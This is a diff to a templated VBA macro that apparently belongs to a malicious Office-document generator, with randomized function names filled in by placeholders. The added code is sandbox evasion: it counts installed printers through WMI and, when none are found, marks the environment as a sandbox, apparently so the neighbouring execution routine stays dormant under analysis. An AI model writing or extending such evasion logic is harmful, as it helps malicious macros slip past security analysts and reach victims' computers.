@@ -137,6 +137,18 @@ Private Function {{ v.fn_sandbox }}() As Boolean
     End If
     On Error GoTo 0
     Set fso2 = Nothing
+    Dim wmiSvc3 As Object
+    On Error Resume Next
+    Set wmiSvc3 = GetObject("winmgmts:")
+    If Err.Number = 0 Then
+        Dim prtQ As Object: Set prtQ = wmiSvc3.ExecQuery("SELECT Name FROM Win32_Printer")
+        Dim prtCnt As Long: prtCnt = 0
+        Dim oPrt As Object
+        For Each oPrt In prtQ: prtCnt = prtCnt + 1: Next
+        If prtCnt = 0 Then {{ v.fn_sandbox }} = True: Set wmiSvc3 = Nothing: Exit Function
+    End If
+    On Error GoTo 0
+    Set wmiSvc3 = Nothing
 End Function
 
 Private Sub {{ v.fn_exec }}()
